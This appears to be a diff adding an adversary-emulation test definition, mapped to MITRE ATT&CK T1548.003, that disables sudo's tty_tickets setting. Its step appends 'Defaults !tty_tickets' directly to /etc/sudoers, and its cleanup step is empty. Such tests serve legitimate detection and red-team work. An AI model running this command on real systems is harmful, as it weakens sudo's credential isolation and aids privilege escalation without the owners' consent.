@@ -1,0 +1,26 @@
+api_version: "2.0"
+name: Disable tty_tickets for sudo caching
+description: |
+    Sets sudo caching tty_tickets value to disabled. This is dangerous to modify without using 'visudo', do not do this on a production system.
+uuid: 91a60b03-fb75-4d24-a42e-2eb8956e8de1
+mitre:
+    tactics:
+        - 'TA0004: Privilege Escalation'
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1548: Abuse Elevation Control Mechanism'
+    subtechniques:
+        - 'T1548.003: Sudo and Sudo Caching'
+requirements:
+    platforms:
+        - os: macos
+        - os: linux
+steps:
+    - name: disable-tty_tickets-for-sudo-caching
+      inline: |
+        sudo sh -c "echo Defaults "'!'"tty_tickets >> /etc/sudoers"
+        sudo visudo -c -f /etc/sudoers
+      executor: sh
+      cleanup:
+        inline: ""
+        executor: sh
